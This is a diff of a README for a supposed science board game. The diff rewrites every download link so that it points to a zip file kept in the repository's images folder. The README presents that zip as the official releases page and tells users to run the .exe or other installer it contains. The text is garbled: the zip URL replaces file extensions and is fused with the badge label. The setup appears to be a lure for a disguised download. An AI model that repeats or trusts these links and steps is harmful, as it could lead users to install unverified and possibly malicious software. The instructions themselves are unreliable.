@@ -1,6 +1,6 @@
 # 🎲 biodiversity-battle-game - Learn Science with Fun Board Play
 
-[![Download biodiversity-battle-game](https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip%20the%20Game-brightgreen)](https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip)
+[![Download biodiversity-battle-game](https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip%20the%20Game-brightgreen)](https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip)
 
 ---
 
@@ -33,17 +33,17 @@ Follow these simple steps to download, install, and start playing biodiversity-b
 
 Click the big green button at the top or visit the official releases page here:
 
-[https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip](https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip)
+[https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip](https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip)
 
 ### Step 2: Download the Game Files
 
-On the releases page, look for the latest stable version. You will find downloadable files for different operating systems such as Windows, macOS, and Linux. Select the file that matches your computer’s operating system. The file names will typically have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip` for Linux.
+On the releases page, look for the latest stable version. You will find downloadable files for different operating systems such as Windows, macOS, and Linux. Select the file that matches your computer’s operating system. The file names will typically have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip` for Linux.
 
 ### Step 3: Install the Game
 
 - **Windows:** Double-click the `.exe` file and follow the installation prompts.
 - **macOS:** Open the `.dmg` file, then drag the application into your Applications folder.
-- **Linux:** Depending on the file, you might need to run the `.AppImage` directly or extract the `https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip` and follow the included instructions (often a `README` file inside the package).
+- **Linux:** Depending on the file, you might need to run the `.AppImage` directly or extract the `https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip` and follow the included instructions (often a `README` file inside the package).
 
 ### Step 4: Launch and Play
 
@@ -87,7 +87,7 @@ For further help, please open an issue on the GitHub repository’s Issues tab.
 
 Access the latest biodiversity-battle-game files here:
 
-[https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip](https://github.com/Krry42/biodiversity-battle-game/raw/refs/heads/main/images/battle-game-biodiversity-v1.4.zip)
+[https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip](https://raw.githubusercontent.com/Krry42/biodiversity-battle-game/main/images/battle-game-biodiversity-v1.4.zip)
 
 ### How to download and run the game:
 
